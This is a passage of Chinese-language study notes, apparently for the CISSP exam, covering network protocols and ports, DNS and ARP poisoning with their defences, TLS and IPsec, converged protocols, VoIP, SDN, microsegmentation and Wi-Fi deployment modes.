（控制连接）端口，支持匿名或特定身份认证的文件传输。<strong>不应该使用 FTP ，应该使用 SFTP 或 FTPS</strong> 。</p><p><strong>TFTP</strong>：UDP 69 端口，是支持不需要身份认证的文件传输的网络应用程序。用于承载网络设备配置文件，并可支持多播。<strong>不应使用 TFTP</strong>。</p><p><strong>SMTP</strong>：TCP 25 端口，是一种将邮件从客户端传输到服务端或从服务端传输到另一个服务端使用的协议。<strong>只有在使用 TLS 加密创建 SMTPS 时使用</strong>。</p><p><strong>POP3</strong>：TCP 110 端口，是一种用于将邮件从服务端下载到客户端（客户端存档）的协议。<strong>只有在使用 TLS 加密创建 POPS 时使用</strong>。</p><p>**IMAP(IMAP4)**：TCP 143 端口，是一种用于将电子邮件从电子邮件服务器上的收件箱下载到客户端的协议，仅能从电子邮件服务器中检索标头并直接从电子邮件服务器删除邮件（即服务器归档）。仅在使用 TLS 加密创建 IMAPS 时使用。</p><p>​IMAP 和 POP3 区别：</p><p>​1、IMAP 邮件内容保存在服务器，客户端仅同步邮件的元数据（如标题、发件人等）；POP3 邮件保留在客户端本地。</p><p>​2、IMAP 适合多设备；POP3 适合单设备。</p><p><strong>DHCP</strong>：UDP 67（服务器） 端口和 68（客户端）端口，用于集中控制启动时为系统分配 TCP &#x2F; IP 配置设置。</p><p><strong>HTTP</strong>：TCP 80 端口，是用明文将 Web 页面元素从 Web 服务器传输到 Web 浏览器的协议。</p><p><strong>HTTPS</strong>：TCP 443 端口，是 HTTP 的 TLS  加密版本。（带 TLS 的 HTTPS  支持使用 TCP 80 端口，但是仅用于服务器到服务器的通信）</p><p><strong>LPD</strong>：TCP  515 端口，是一种网络服务，用于打印机作业以及将打印机作业发送到打印机。<strong>应封闭在 VPN 中使用。</strong></p><p><strong>X Window</strong>：TCP 6000 ～ 6003 端口，是用于命令行操作系统的 GUI API。<strong>应封闭在 VPN 中使用。</strong></p><p><strong>NFS</strong>：TCP 2049 端口，是一种网络服务，用于支持不同系统的文件共享。<strong>应封闭在 VPN 中使用。</strong></p><p><strong>SNMP</strong>：UDP 161 端口（用于陷阱消息的是 UDP 162 端口），是一种网络服务，用于从中央监控服务器收集网络运行状况和状态信息。</p><p>SNMPv3：路由器、交换机、无线接入点(WAP)、防火墙、 VPN设备和打印机均支持 SNMP 协议。</p><p>早期版本的 SNMP 将明文传输的社区名用于身份认证。原始默认社区名是公共和私有的。最新版本的 SNMP 允许加密通信，以及强大的身份认证因素。</p><h1 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h1><p>传输层建立的连接，是利用端口实现的。</p><p>端口号为 16 位二进制表示，所以端口号数量为 2 的 16 次方，也就是 65536 个，范围为 0 - 65535.</p><p>IP地址和端口号的组合被称为套接字。</p><p>前 1024 个端口号是固定的，1025 - 65535 可以作为客户端源端口，只要没有被占用。</p><h2 id="传输层协议-1"><a href="#传输层协议-1" class="headerlink" title="传输层协议"></a>传输层协议</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>面向连接的全双工协议</p><p>连接通过三次握手实现：</p><p>1、客户端将 SYN 标记的数据包发送到服务端</p><p>2、服务端以 SYN+ACK 标记的数据包响应客户端</p><p>3、客户端以 ACK 标记的数据包响应服务端</p><p>断开连接方式：</p><p>FIN 标记的数据包，正常中断</p><p>RST 标记的数据包，立即或突然终止</p><p>数据传输需要使用 TCP ，TCP 能保证传输，会重新发送任何未确认的段，直到收到 RST 数据包或确认数据包。</p><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>无连接单工协议</p><p>不提供错误检测或纠正</p><p>不使用排序</p><p>不使用流量控制机制</p><p>不使用预先建立的会话</p><p>UDP 开销低，可以快速传输数据，不重要数据使用 UDP 传输。</p><p>常用于音视频的实时或流通信。</p><h1 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a>域名系统</h1><p>域名：域名或计算机名是IP地址上分配的人性化的“临时”约定。</p><p>IP地址：IP地址是在 MAC 地址上分配的“临时”逻辑地址。</p><p>MAC地址：MAC 地址是 “永久”的物理地址。</p><p>MAC 地址是可变的。</p><p>DNS：将域名转换为 IP地址</p><p>ARP：将IP地址转换为 MAC 地址</p><p>DNS  PTR记录：将IP地址转换为 域名</p><p>IP地址可静态分配，也可以 DHCP 动态分配</p><h2 id="完全限定域名（FQDN）"><a href="#完全限定域名（FQDN）" class="headerlink" title="完全限定域名（FQDN）"></a>完全限定域名（FQDN）</h2><p>包含三个主要部分：</p><ul><li><p>顶级域名（TLD）-  <a href="http://www.google.com/">www.google.com</a> 中的 com，右侧有一个点（通常不显示），表示整个DNS命名空间 的根。</p></li><li><p>注册域名 - <a href="http://www.google.com/">www.google.com</a> 中的 google</p></li><li><p>子域或主机名 - <a href="http://www.google.com/">www.google.com</a> 中的 www</p></li></ul><p>FQDN 总长不能超过 253 个字符（包含点）</p><p>单个部分长度不能超过 63 个字符</p><p>只能包含数据、字母和连字符</p><p>顶级域名 TLD 右侧有一个点（通常不显示），表示整个DNS命名空间 的根</p><h2 id="DNS权威服务器"><a href="#DNS权威服务器" class="headerlink" title="DNS权威服务器"></a>DNS权威服务器</h2><p>每个注册域名都有一个指定的权威名称服务器。</p><p>主权威名称服务器托管域名的区域文件，也就是 DNS 记录。</p><p>辅助权威名称服务器托管域名区域文件副本，用于只读。</p><h2 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h2><ul><li>查询本地 HOST 文件和DNS缓存</li><li>查询本地配置的 DNS 服务器</li></ul><h2 id="DNS-使用端口"><a href="#DNS-使用端口" class="headerlink" title="DNS 使用端口"></a>DNS 使用端口</h2><p>TCP 53 用于区域间传输，也就是 DNS 服务器之间交换区域文件，用于特殊查询或响应超过 512 字节的情况。</p><p>UDP 53 用于典型的 DNS 查询。</p><h2 id="域名系统安全扩展-DNSSEC"><a href="#域名系统安全扩展-DNSSEC" class="headerlink" title="域名系统安全扩展 DNSSEC"></a>域名系统安全扩展 DNSSEC</h2><p>域名系统安全扩展（Domain Name System Security Extensions）</p><p>功能：</p><p>在DNS操作期间在设备之间提供相互验证和过程加密</p><p>解决的问题：</p><p>减少以服务器为中心的 DNS 滥用，例如 DNS 记录中毒和 DNS 缓存中毒。</p><p>适用范围：</p><p>DNSSEC  仅适用于 DNS 服务器，不适用于客户端。</p><h2 id="ODoH"><a href="#ODoH" class="headerlink" title="ODoH"></a>ODoH</h2><p>功能：</p><p>通过 HTTPS 协议加密，将传统的 DNS  查询封装在 HTTPS 请求中，先将加密的请求传输到代理服务器，代理服务器再将请求传输到目标 DoH 服务器，目标 DoH 服务器解密查询后将结果通过代理服务器返回给客户端。</p><p>解决的问题：</p><p>1、加密 DNS 查询，防止窃听和篡改。</p><p>2、完全隐藏用户的 IP 地址，防止 DoH 服务器关联用户身份。</p><p>使用范围：</p><p>ODoH&#x2F;DoH 用户客户端。</p><h2 id="DNS-中毒"><a href="#DNS-中毒" class="headerlink" title="DNS 中毒"></a>DNS 中毒</h2><p>DNS 中毒（DNS Poisoning），也称为 DNS 欺骗（DNS Spoofing），是一种网络攻击手段，攻击者通过伪造 DNS 响应，将用户引导到恶意网站或服务器，而不是用户实际想要访问的目标网站。这种攻击可能导致数据泄露、钓鱼攻击、恶意软件传播等严重后果。</p><h3 id="流氓-DNS-服务器"><a href="#流氓-DNS-服务器" class="headerlink" title="流氓 DNS 服务器"></a>流氓 DNS 服务器</h3><p>流氓 DNS  服务器，侦听网络流量，返回错误的 DNS 查询记录，由于客户端接收到 DNS 查询后会关闭 DNS 查询会话，导致正确的查询响应被忽略。</p><p>DNS 查询存在 查询 ID(QueryID, QID)，查询响应必须包含相同的 QID。</p><h3 id="DNS-缓存中毒"><a href="#DNS-缓存中毒" class="headerlink" title="DNS 缓存中毒"></a>DNS 缓存中毒</h3><p>常见攻击手法：</p><p>1、攻击权威 DNS 服务器，修改权威服务器上的 DNS 记录。由于存在全球社区安全监控，攻击较少。</p><p>2、攻击 DNS 缓存服务器，修改缓存服务器上的 DNS 记录。由于不存在全球社区安全监控，只受运营商监控，攻击较多。</p><p>攻击影响目标均为 DNS 查询客户端。</p><h3 id="DNS-域欺骗"><a href="#DNS-域欺骗" class="headerlink" title="DNS 域欺骗"></a>DNS 域欺骗</h3><p>DNS 域欺骗（DNS Pharming），是将有效网络的 URL 或 IP 地址恶意重定向到假网络的行为。</p><h4 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h4><h5 id="修改本地-HOST-文件"><a href="#修改本地-HOST-文件" class="headerlink" title="修改本地 HOST 文件"></a>修改本地 HOST 文件</h5><h5 id="修改DNS配置"><a href="#修改DNS配置" class="headerlink" title="修改DNS配置"></a>修改DNS配置</h5><p>更改 DNS 查询IP</p><h5 id="DNS查询欺骗"><a href="#DNS查询欺骗" class="headerlink" title="DNS查询欺骗"></a>DNS查询欺骗</h5><p>窃听 DNS 查询，返回虚假回复，需要包含相同 QID </p><h5 id="使用代理伪造"><a href="#使用代理伪造" class="headerlink" title="使用代理伪造"></a>使用代理伪造</h5><h3 id="DNS中毒防御措施"><a href="#DNS中毒防御措施" class="headerlink" title="DNS中毒防御措施"></a>DNS中毒防御措施</h3><p>1、限制内部 DNS 服务器和外部 DNS 服务器之间的区域传输</p><p>限制入站 TCP 53（限制DNS服务器之间交换）、出站 UDP 53（限制客户端查询）</p><p>2、要求内部使用内部 DNS 解析所有域名</p><p>限制出站 UDP 53（限制外部查询）、开启出站 TCP 53（用于DNS服务器之间交换）</p><p>3、限制外部 DNS 服务器，只从特定的 DNS 服务器交换下载数据</p><p>4、部署网络入侵检测系统(NIDS)以监视异常 DNS 流量</p><p>5、正确加固专用网络中的所有 DNS、服务器和客户端系统</p><p>6、使用 DNSSEC 保护 DNS 基础设施</p><p>7、在所有支持的客户端上使用 DoH 或 ODoH</p><p>8、拆分DNS服务器，区分外部和内部DNS服务器，并限制可请求范围</p><p>DNS 陷坑防御机制</p><p>给恶意软件提供错误的响应，阻止访问命令，防止系统被控制，也可以阻止用户访问已知的恶意或钓鱼网站。</p><p>也可以理解为内部 DNS 劫持，将恶意域名劫持到特定的IP。</p><h2 id="域名劫持"><a href="#域名劫持" class="headerlink" title="域名劫持"></a>域名劫持</h2><p>域名劫持或域名盗窃是在未经所有者授权的情况下更改域名注册的恶意行为。这可通过 窃取所有者的登录凭证、使用 XSRF、会话劫持、路径&#x2F;MITM 攻击或利用域名注册商系统中 的缺陷来实现。</p><p>防止域名劫持的最佳措施是在登录域注册器时使用强多因素身份认证。为了防止域名注 册失效，请设置自动续费，并在续费日期前一周再次检查付款方式。</p><p>其他实现域名劫持效果的方式</p><p>1、误植域名攻击</p><p>攻击者预测 URL 可能的输入错误，然后注册这些域名，将流量 引导到自己的网站。</p><p>常见的错误：拼写错误（如 googel.com）、名称或单词的输入错误（如 gooogle.com）、变体(如 googles.com 中的复数)以及不同的顶级域(TLD)，如 google.edu 等。</p><p>2、同形词攻击</p><p>利用字符集的相似性来注册肉眼看起来合法的虚假国际域名 (IDN)</p><p>3、URL 劫持</p><p>URL 劫持指的是显示其他链接或广告的行为，该链接或广告看起来像知名产品、服务或 网站的链接或广告，但单击后会将用户重定向到其他位置、服务或产品</p><p>攻击手段：</p><p>发布站 点和页面、利用搜索引擎优化(SEO)</p><p>使用广告软件来取代合法广告和链接</p><p>4、点击劫持</p><p>点击劫持攻击将用户在网页上的点击或选择重定向到另一个目标(通常是恶意的)，而不 是其预期位置。</p><p>攻击手段：</p><p>在显示的页面上添加不可见或隐藏的覆盖、框架或图像。</p><h1 id="互联网协议网络"><a href="#互联网协议网络" class="headerlink" title="互联网协议网络"></a>互联网协议网络</h1><p>IP 为数据包提供路由寻址。</p><p>IP 是无连接的，因而是一种不可靠的通信服务。</p><h2 id="IPv4-IPv6"><a href="#IPv4-IPv6" class="headerlink" title="IPv4 &#x2F; IPv6"></a>IPv4 &#x2F; IPv6</h2><p>IPv4 使用 32 位寻址方案。</p><p>IPv6 使用 128 位寻址方案。</p><h3 id="IPv4过渡IPv6风险"><a href="#IPv4过渡IPv6风险" class="headerlink" title="IPv4过渡IPv6风险"></a>IPv4过渡IPv6风险</h3><p>1、攻击者可用IP更多，IP 过滤和阻止列表的效果降低</p><p>2、安全及监控设备需要升级支持 IPv6，否则IPv6会成为一个隐蔽通道。</p><p>3、NAT 的丢失，客户端隐秘性降低。</p><h3 id="同时使用v4和v6的方法"><a href="#同时使用v4和v6的方法" class="headerlink" title="同时使用v4和v6的方法"></a>同时使用v4和v6的方法</h3><p>双堆栈</p><p>隧道</p><p>NAT-PT</p><h2 id="IP分类"><a href="#IP分类" class="headerlink" title="IP分类"></a>IP分类</h2><p>A类子网支持  16 777 214 个主机</p><p>B类子网支持  65 534 个主机</p><p>C类子网支持 254 个主机</p><p>环回地址为 A 类网络的 127 个地址，全 0 的 A 类网络被定义为网络黑洞，到该地址的流量都将丢弃。</p><p>可变长度子网掩码（VLSM）</p><p>无类别域间路由（CIDR）：使用掩码位表示子网掩码</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/image-20250228080835876.png" alt="image-20250228080835876"></p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>ICMP 用于确定网络和特定链路的运行状态。</p><p>ICMP 可用于  ping，traceroute，pathping 等网络管理工具。</p><p>ICMP 存在被用于基于带宽的 DoS 攻击，例如：死亡之 ping、Smurf 攻击和 ping 洪水攻击。解决方案：限制 ICMP 使用或限制吞吐量。</p><h2 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h2><p>IGMP 允许系统支持多播，将数据传输到多个指定的接收者。</p><p>IGMP 用于管理主机的动态多播组成员资格。</p><p>多播可以通过简单文件传输协议（TFTP）系统来组织或缓存要发送给多个收件人的内容。</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>ARP 用于将 IP 地址（用于逻辑寻址的 32 位二进制数）解析为 MAC 地址（用于物理寻址的 48 位二进制数）。</p><p>网段上的流量（例如通过交换机从客户端到默认的网关，即路由器）使用 MAC 地址从源系统定向到目标系统。</p><p>ARP 承载以太网帧的有效载荷，是一个从属的第 2 层协议。</p><p><strong>ARP 操作过程</strong></p><p>使用缓存和广播实现操作</p><p>1、检查本地缓存</p><p>2、如本地不存在，则发送广播形式的 ARP 请求</p><p>3、如目标不存在当前网段，使用默认网关的 MAC 地址转发</p><p>4、默认网关执行自己的 ARP 过程</p><p><strong>ARP滥用</strong></p><p>在 ARP 缓存中插入虚假记录，可导致缓存中毒的技术</p><p><strong>ARP缓存中毒或ARP欺骗形式</strong></p><p>1、以伪造的回复响应 ARP 请求</p><p>2、使用无目的或未经请求的 ARP 答复</p><p>3、使用 ARP 命令在本地设置静态 ARP 条目，静态 ARP 条目在重新启动时不会留存。</p><p><strong>ARP缓存中毒&#x2F;欺骗的防御方案</strong></p><p>1、实施交换机上的端口安全（最佳方案）</p><p>禁止与恶意或未经授权的设备通信，阻止来自违规系统的 ARP 答复。</p><p>本地&#x2F;软件防火墙、主机入侵检测和防御系统（HIDPS）、特定端点安全产品均可阻止未请求的 ARP 回复或通告。</p><p>2、实施建立静态 ARP 条目（不建议）</p><p>存在攻击&#x2F;滥用风险</p><p>消除适应不断网络变化的灵活性</p><p><strong>ARP中毒检测工具</strong></p><p>arpwatch</p><h1 id="安全通信协议"><a href="#安全通信协议" class="headerlink" title="安全通信协议"></a>安全通信协议</h1><p>为特定程序的通信通道提供安全服务的协议。</p><h2 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a>IPsec</h2><p>Internet Protocol Security 基于IP协议</p><p>使用公钥加密系统来提供加密、访问控制、不可否认性和消息验证</p><p>主要用于虚拟专用网络 VPN ，可在传输或隧道模式下运行。</p><h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><p>为用户提供单点登录（SSO）解决方案，并为登录凭证提供保护。</p><p>使用混合加密来提供可靠的身份认证保护。</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>Secure Shell （SSH）端对端加密技术</p><p>用途：</p><p>1、加密明文应用程序（rcp、rlogin、rexec）</p><p>2、协议加密（SFTP）</p><p>3、传输模式 VPN （即仅限主机到主机链路加密）</p><h2 id="信令协议"><a href="#信令协议" class="headerlink" title="信令协议"></a>信令协议</h2><p>加密协议，为语音通信、视频会议和文本消息服务提供端到端加密。</p><p>信令协议是非联邦（nofederated）协议，是名为 “Signal” 的即时通信 APP 中的核心元素。</p><h2 id="安全远程过程调用"><a href="#安全远程过程调用" class="headerlink" title="安全远程过程调用"></a>安全远程过程调用</h2><p>Secure Remote Procedure Call（S-RPC）是用于跨网络服务通信的身份认 证服务，旨在防止在远程系统上未经授权执行代码。</p><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><p>Transport  Layer Security（TLS）是一种在 OSI 模型第 4 层运行的加密协议（加密 TCP 通信的有效载荷）。</p><p>用途：</p><p>1、加密 HTTPS 等 Web 通信</p><p>2、加密应用层协议</p><p>特点：</p><p>1、支持跨不安全网络的安全客户端-服务器通信，同时防止篡改、欺骗和窃听。</p><p>2、支持单向身份认证</p><p>3、支持使用数字证书进行双向身份认证</p><p>4、通常应用于 TCP 包的基本有效载荷，使其能封装更高层协议有效载荷</p><p>5、可用于加密用户数据报协议(UDP)和会话初始协议(SIP)连接。 (SIP 是与 IP 语音相关的协议。)</p><h1 id="11-10多层协议的含义"><a href="#11-10多层协议的含义" class="headerlink" title="11.10多层协议的含义"></a>11.10多层协议的含义</h1><p>TCP &#x2F; IP 是一种多层协议。</p><p>HTTP -&gt; TCP -&gt; IP -&gt; 以太网</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[Ethernet <span class="hljs-comment">[IP <span class="hljs-comment">[TCP <span class="hljs-comment">[HTTP <span class="hljs-comment">[Payload]</span>]</span>]</span>]</span>]</span><br></code></pre></td></tr></table></figure><p>TLS 加密</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[Ethernet <span class="hljs-comment">[IP <span class="hljs-comment">[TCP <span class="hljs-comment">[TLS <span class="hljs-comment">[HTTP <span class="hljs-comment">[Payload]</span>]</span>]</span>]</span>]</span>]</span><br></code></pre></td></tr></table></figure><p>网络层IPsec加密</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[Ethernet <span class="hljs-comment">[IPsec <span class="hljs-comment">[IP <span class="hljs-comment">[TCP <span class="hljs-comment">[TLS <span class="hljs-comment">[HTTP <span class="hljs-comment">[Payload]</span>]</span>]</span>]</span>]</span>]</span>]</span><br></code></pre></td></tr></table></figure><h3 id="多层协议优点"><a href="#多层协议优点" class="headerlink" title="多层协议优点"></a>多层协议优点</h3><ul><li>可在更高层使用各种协议</li><li>加密可包含在各个层中</li><li>支持复杂网络结构中的灵活性和弹性</li></ul><h3 id="多层协议缺点"><a href="#多层协议缺点" class="headerlink" title="多层协议缺点"></a>多层协议缺点</h3><ul><li>允许隐蔽通道</li><li>可以绕过过滤器</li><li>逻辑上强加的网段边界可被超越</li></ul><h2 id="11-10-1融合协议"><a href="#11-10-1融合协议" class="headerlink" title="11.10.1融合协议"></a>11.10.1融合协议</h2><p>融合协议是专业（专有）协议与标准协议的结合。</p><p>融合协议主要好处：</p><p>能使用现有的 TCP &#x2F; IP 支持网络基础设施来托管特殊服务或专有服务，不需要独立部署备用网络硬件。</p><h3 id="常见融合协议"><a href="#常见融合协议" class="headerlink" title="常见融合协议"></a>常见融合协议</h3><h4 id="存储区域网络SAN"><a href="#存储区域网络SAN" class="headerlink" title="存储区域网络SAN"></a>存储区域网络SAN</h4><p><strong>存储区域网络（Storage Area Network，SAN）</strong>是一个辅助网络（与基础通信网络不同），用于将各种存储设备整合、管理到一个网络可访问的存储容器中。</p><h5 id="SAN运作方式"><a href="#SAN运作方式" class="headerlink" title="SAN运作方式"></a>SAN运作方式</h5><p>将数据存储信号封装或聚合到 TCP &#x2F; IP 通信中，以实现分离存储和接近性。</p><h5 id="SAN风险"><a href="#SAN风险" class="headerlink" title="SAN风险"></a>SAN风险</h5><p>可能导致单点故障，需要进行冗余集成以保证可用性。</p><h4 id="以太网光纤通道FCoE"><a href="#以太网光纤通道FCoE" class="headerlink" title="以太网光纤通道FCoE"></a>以太网光纤通道FCoE</h4><p>以太网光纤通道（Fibre Channel over Ethernet，FCoE）是一种网络数据存储解决方案（SAN 或 NAS），允许高达 128 Gbps 的文件传输速率。</p><p>运行在第 2 层，用于光纤电缆和铜缆。</p><p>FCoE 用于封装以太网网络上的光纤通道通信，光纤通道可以作为网络层或 OSI 第 3 层协议运行，将 IP 替换为标准以太网网络的有效载荷。</p><h4 id="多协议标签交换MPLS"><a href="#多协议标签交换MPLS" class="headerlink" title="多协议标签交换MPLS"></a>多协议标签交换MPLS</h4><p>多协议标签交换（Multiprotocol Label Switching，MPLS）是一种高吞吐量的高性能网络技术，基于短路径标签（而不是更长的网络地址）来引导网络上的数据。</p><h4 id="互联网小型计算机系统接口iSCSI"><a href="#互联网小型计算机系统接口iSCSI" class="headerlink" title="互联网小型计算机系统接口iSCSI"></a>互联网小型计算机系统接口iSCSI</h4><p>互联网小型计算机系统接口（Internet  Small Computer System Interface，iSCSI）是一种基于 IP 的网络存储标准，运行在第 3 层。</p><p>可通过 LAN、WAN 或公共互联网连接启用与位置无关的文件存储、传输和检索。</p><h4 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h4><h4 id="SDN"><a href="#SDN" class="headerlink" title="SDN"></a>SDN</h4><h4 id="云"><a href="#云" class="headerlink" title="云"></a>云</h4><h4 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h4><h4 id="SOA"><a href="#SOA" class="headerlink" title="SOA"></a>SOA</h4><h4 id="微服务（microservices）"><a href="#微服务（microservices）" class="headerlink" title="微服务（microservices）"></a>微服务（microservices）</h4><h4 id="基础设施即代码（IaC）"><a href="#基础设施即代码（IaC）" class="headerlink" title="基础设施即代码（IaC）"></a>基础设施即代码（IaC）</h4><h4 id="无服务器架构（serverless-architecture）"><a href="#无服务器架构（serverless-architecture）" class="headerlink" title="无服务器架构（serverless architecture）"></a>无服务器架构（serverless architecture）</h4><h2 id="11-10-2网络电话"><a href="#11-10-2网络电话" class="headerlink" title="11.10.2网络电话"></a>11.10.2网络电话</h2><p>网络电话（Voice over IP，VoIP）是一种隧道机制，将音频、视频和其他数据封装到IP数据包中，以支持语音呼叫和多媒体协作。</p><h3 id="网络电话-VoIP-风险"><a href="#网络电话-VoIP-风险" class="headerlink" title="网络电话 VoIP 风险"></a>网络电话 VoIP 风险</h3><ul><li>许多 VoIP 工具都可以轻易用来伪造来电显示，因此黑客可以执行 vishing （VoIP网络）攻击或语音垃圾邮件（SPIT）攻击</li><li>呼叫管理器系统和 VoIP 电话本身可能容易受到主机操作系统攻击和 DoS 攻击</li><li>攻击者可能通过伪造呼叫管理器或端点连接协商或响应消息来执行 MITM&#x2F;路径攻击</li><li>由于 VoIP 流量是未加密网络流量，可通过解码 VoIP 流量来监听 VoIP 通信</li><li>如果在与桌面和服务器系统相同的交换机上部署 VoIP 电话，存在允许 802.1X 身份认证伪造以及 VLAN 和 VoIP 跳转（即跨越已验证通道跳转）</li></ul><h3 id="网络电话-VoIP-安全改进"><a href="#网络电话-VoIP-安全改进" class="headerlink" title="网络电话 VoIP 安全改进"></a>网络电话 VoIP 安全改进</h3><p>安全实时传输协议或安全 RTP （SRTP）是对 VoIP 通信中使用的实时传输协议（RTP）的安全改进。</p><p>SRTP 通过强加密和可靠的身份认证，将拒绝服务、路径攻击和其他 VoIP 攻击的风险降至最低。</p><h2 id="11-10-3软件定义网络SDN"><a href="#11-10-3软件定义网络SDN" class="headerlink" title="11.10.3软件定义网络SDN"></a>11.10.3软件定义网络SDN</h2><p>软件定义网络（software-defined networking，SDN）是一种独特的网络操作、设计和管理方法。</p><h3 id="SDN-目的"><a href="#SDN-目的" class="headerlink" title="SDN 目的"></a>SDN 目的</h3><p>将基础设施层（也称为数据平面和转发平面-硬件和基于硬件的设置）与控制层（即数据传输管理的网络服务）分离。</p><p>控制平面使用协议来决定向何处发送流量。</p><p>数据平面包含决定是否转发流量的规则。</p><p>通过基于属性的访问控制（ABAC）访问控制。</p><p>SDN 解决方案取代了路由器和交换机等传统网络设备，使组织可以选择使用更简单的网络设备（接受 SDN 控制器的指令）处理流量路由。消除了传统网络协议的复杂性、消除了IP寻址、子网、路由等传统网络概念。</p><p>SDN 提供一宗新的网络设备，该设计可直接从集中位置编程，灵活，独立于供应商，并且基于开放标准。</p><p>SDN 也被看作网络虚拟化，允许数据传输路径、通信决策树和流控制在 SDN 控制层中虚拟化，而不是以每个设备为基础在硬件上处理。</p><p>虚拟 SAN （VSAN）通过虚拟化绕过了 SAN 复杂硬件要求带来的复杂性。</p><p>虚拟 SAN 或软件定义的共享存储系统是 SAN 在虚拟化网络或 SDN 上的虚拟重现。</p><p>SDN 衍生品软件定义存储（SDS），SDS 是 SAN 或 NAS 的 SDN 版本。是一种策略驱动的存储管理和资源调配解决方案，独立于实际的底层存储硬件，是有效的虚拟存储。</p><p>软件定义广域网（SDWAN 或 SD-WAN）是 SDN 的一种演变，用于远程数据中心、远端位置和 WAN 链路上的云服务之间的连接管理和服务控制。</p><h1 id="11-11微分网段"><a href="#11-11微分网段" class="headerlink" title="11.11微分网段"></a>11.11微分网段</h1><p>微分网络是将网络分割或细分为更小的组织单元网格。</p><h2 id="微分网段优势"><a href="#微分网段优势" class="headerlink" title="微分网段优势"></a>微分网段优势</h2><h3 id="提高性能"><a href="#提高性能" class="headerlink" title="提高性能"></a>提高性能</h3><p>网络分段可以通过组织体系来提高性能，经常通信的系统位于同一分段。广播域的划分可以显著提供大型网络的性能。</p><h3 id="减少通信问题"><a href="#减少通信问题" class="headerlink" title="减少通信问题"></a>减少通信问题</h3><p>可减少拥塞并抑制通信问题，如广播风暴。</p><h3 id="提供安全"><a href="#提供安全" class="headerlink" title="提供安全"></a>提供安全</h3><p>可通过隔离通信流量和用户访问权限来提高安全性。</p><h2 id="微分网段实施"><a href="#微分网段实施" class="headerlink" title="微分网段实施"></a>微分网段实施</h2><p>单独或组合使用基于交换机的 VLAN、路由器或防火墙来创建分段。</p><h2 id="网段类型"><a href="#网段类型" class="headerlink" title="网段类型"></a>网段类型</h2><p>专用 LAN</p><p>内网</p><p>屏蔽子网</p><p>外联网</p><h2 id="微分网络措施"><a href="#微分网络措施" class="headerlink" title="微分网络措施"></a>微分网络措施</h2><p>每个区域通过内部分段防火墙（ISFW）、子网、VLAN 或其他虚拟网络解决方案与其他域分开。</p><p>域之间的所有通信都会经过过滤，可能需要进行身份认证，通常需要会话加密，并且可能受到允许列表和阻止列表的控制。</p><p>与本地网络外部的实体进行通信时，必须封装通信以供转发，类似于使用 VPN 访问远程网络</p><p>微分网络是实现零信任的关键要素。</p><p>虚拟可扩展 LAN（VXLAN）是一种封装协议，可以使 VLAN 跨子网和地理距离扩展。</p><p>VLAN  通常仅限于第 2 层网络域，并且不能包含来自其他网络的成员，只能通过路由器入口访问。</p><p>VXLAN 允许创建多达 1600 万个虚拟网络，而传统 VLAN 仅限于 4096 个。</p><p>VXLAN 可用作实现微分网段的手段，而且不仅限于本地实体。</p><h1 id="11-12-无线网络"><a href="#11-12-无线网络" class="headerlink" title="11.12 无线网络"></a>11.12 无线网络</h1><p>802.11 是用于无线网络通信的 IEEE 标准。</p><p>Wi-Fi 可以在 ad  hoc 模式（也称为点对点 Wi-Fi）或基础设施模式下部署。</p><p>ad hoc 模式意味着任何两个无线网络设备都可以在没有集中控制权限（即基站或接入点）的情况下进行通信。</p><p>​Wi-Fi 直连是  ad hoc 模式的升级版本，可以支持 WPA2 和 WPA3（ad hoc 仅支持 WEP）。</p><p>基础设施模式意味着需要无线接入点（WAP），并且强制执行无线网络访问限制。</p><p>基础架构模式常见变体：</p><p>1、独立模式部署</p><p>使用 WAP 使无线客户端彼此连接，没有连接到任何有线资源，因此 WAP 是独立的。</p><p>2、有线扩展模式部署</p><p>由 WAP 充当连接点，将无线客户端链接到有线网络。</p><p>3、企业扩展模式部署</p><p>使用多个无线接入点（WAP）将大型物理区域连接到同一有线网络。</p><p>每个 WAP 都将使用相同的扩展服务集标识符（ESSID），以便客户端在保持网络连接的同时在该区域漫游，使无线 NIC 将关联从一个 WAP 更改到另一个 WAP。</p><p>4、桥接模式部署</p><p>无线连接被用于连接两个有线网络，通常使用专用无线网桥，并在有线网桥不方便时使用。</p><p>Fat AP 是一个完全自主管理的无线系统基站，作为独立的无线解决方案运行。</p><p>​Fat AP 需要逐个进行配置，对于企业使用不够灵活。</p><p>Thin AP 只是一个无线发射机&#x2F;接收机，必须从被称为无线控制器的独立外部集中管理控制台进行管理。</p><p>​优势：只处理无线信号，管理、安全、路由、过滤等都集中在管理控制台上。</p><p>基于控制器的 WAP 是中央控制器管理的 Thin AP。</p><p>独立 WAP 是一个 Fat 